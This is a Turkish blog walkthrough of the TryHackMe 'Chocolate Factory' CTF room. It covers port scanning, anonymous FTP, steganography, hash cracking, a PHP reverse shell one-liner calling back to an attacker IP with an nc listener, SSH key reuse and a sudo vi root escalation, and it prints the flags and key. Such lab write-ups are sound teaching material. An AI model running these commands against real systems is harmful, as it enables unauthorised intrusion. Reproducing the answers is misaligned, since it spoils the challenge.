Bugün sizlerle beraber TryHackme’de bulunan Chocolate Factory isimli ctf odasını çözeceğiz.

![](/blogs/img/chocolatefactory-writeup/1.png)


İlk olarak hedef makinede nmap taraması yapalım.

![](/blogs/img/chocolatefactory-writeup/2.png)


**Komut:** `nmap -p- 10.112.166.82`

* -p- parametresi tüm portları taramamızı sağlar.

Nmap çıktısına baktığımızda pek çok portun açık olduğunu görüyoruz.

Taramayı birkaç işe yarayacağını düşündüğüm porta indirgiyorum.

![](/blogs/img/chocolatefactory-writeup/3.png)

**Komut:** `nmap -sV -sC -p 21,22,80 10.112.166.82`

* -sV parametresini port versiyon bilgisi almak için kullandık

* -sC parametresini portlarda varsayılan scriptlerle tarama yapmak için kullandık.

* -p parametresi ile taramak istediğimiz portları belirttik.

Burda port 21 de bulunan ftp servisine anonymous giriş olduğunu öğrendik.

![](/blogs/img/chocolatefactory-writeup/4.png)

Başarılı bir şekilde ftpden giriş yaptık.

![](/blogs/img/chocolatefactory-writeup/5.png)

Burda ftp sunucusunda olan dosyaları listelediğimizde gum_room.jpg isimli bir resim dosyası ile karşılaştık ve bilgisayarımıza indirdik.

Bu noktada ilk aklıma gelen resim dosyasına bir veri gizlendiğiydi ve haklıydım.

![](/blogs/img/chocolatefactory-writeup/6.png)

**Komut:** `steghide extract -sf gum_room.jpg`

* “extract” alt komutunu dosya çıkarmak için kullandık.

* -sf parametresini dosya belirtmek için kullandık.

Resme gizlenen dosyayı çıkardım.

![](/blogs/img/chocolatefactory-writeup/7.png)

Dosyanın içeriğini okuduğumda şifrelenmiş bir veri karşıma çıktı.

Aklıma ilk gelen şey bunun bir base64 ile kodlanmış bir veri olduğuydu ve base64 kullanarak decode etmeyi denedim.

![](/blogs/img/chocolatefactory-writeup/8.png)

Ve bingo.

Çıktı bana /etc/shadow formatını hatırlattı.

Burda bizim için kritik olabilecek bir şey keşfettim.

![](/blogs/img/chocolatefactory-writeup/9.png)

“charlie” kullanıcısına ait parola hashi

Şimdi sıra bu parola hashini kırmakta önce hash değerini hash.txt isimli bir dosyaya yapıştırdım.

Sonra john aracını kırarak charlie kullanıcısının parolasını buldum.

**Parola:** cn7824

Daha önce yaptığımız nmap taramasında 80 portunda bir web sunucusu çalıştığını görmüştük oraya bakalım.

![](/blogs/img/chocolatefactory-writeup/10.png)

Burada daha önce bulduğumuz kullanıcı adı ve şifreyi kullanarak giriş yaptım.

Ardından beni bir komut çalıştırma sayfası karşıladı.

![](/blogs/img/chocolatefactory-writeup/11.png)

Burda bir reverse shell bağlantısı kurmayı düşündüm.

Kendi terminalimde 4444 portunu dinleyen bir dinleyici başlattım.

![](/blogs/img/chocolatefactory-writeup/12.png)

**Komut:** `nc -lvnp 4444`

Ardından websitesindeki komut çalıştırma kısmından bir php reverse shell bağlantısı başlattım

![](/blogs/img/chocolatefactory-writeup/13.png)

**Komut:** `php -r ‘$sock=fsockopen(“10.112.73.4”,4444);exec(“/bin/bash -i <&3 >&3 2>&3”);’`

![](/blogs/img/chocolatefactory-writeup/14.png)

Reverse shell bağlantısı sağladık.

Charlie’nin home dizinini incelerken teleport adında ilgi çekici bir dosya buldum ve içeriğini okudum.

![](/blogs/img/chocolatefactory-writeup/15.png)

Bu bir rsa private key.

Bu rsa private key charlie kullanıcısına ait ve bu dosyayı kullanarak charlie kullanıcısı olarak girebileceğiz.

Bunun için bu private keyi kendi bilgisyarıma kopyaladım ve izinleri ayarladım(dosya fazla izne sahipse hata veriyor.).

Ardından ssh üzerinden charlie olarak giriş yaptık.

![](/blogs/img/chocolatefactory-writeup/16.png)

Charlie’nin home dizininden user flag’i aldık.

![](/blogs/img/chocolatefactory-writeup/17.png)

**User Flag:** `flag{cd5509042371b34e4826e4838b522d2e}`

Şimdi sırada root flag var. Bunun için root yetkisi elde etmemiz lazım.

![](/blogs/img/chocolatefactory-writeup/18.png)

“sudo -l” komutunu yazdığımda beni ilginç bir şey karşıladı. “vi” komutunu sudo ile root yekisi ile çalıştırabiliyordum. Gtfobins’ten root shell’i nasıl alırım diye baktım.

![](/blogs/img/chocolatefactory-writeup/19.png)

**Komut:** `sudo vi -c ‘:!/bin/bash’ /dev/null`

Artık root kullanıcısı olduk.

Root kullanıcısının home dizininden gene ilginç bir dosya buldum ve “cat” komutu ile içeriğini inceledim.

![](/blogs/img/chocolatefactory-writeup/20.png)

Bu scriptte doğru key’i girince script bize root flag’i verecek.

Şimdiye kadar token’ı bulamamıştım bu yüzden bu noktada biraz takıldım. Sonra nmap taramasında diğer portları da detaylı taramaya karar verdim ve bir portta aradığımı buldum.

Daha önceki yaptığımız nmap taramasında açık olan 113 portunda daha kapsamlı tarama yapınca bize bir ipucu veriyor.

![](/blogs/img/chocolatefactory-writeup/21.png)

İlgili linke gidip dosyayı indirdim.

Dosya bir hayli karmaşıktı bu yüzden “strings” komutu ile stringleri ayıkladım.

**Key:** `b’-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=’`

İlgili scripti çalıştırıp key’i girince bize root flag’ı veriyor.

**Root Flag:** `flag{cec59161d338fef787fcb4e296b42124}`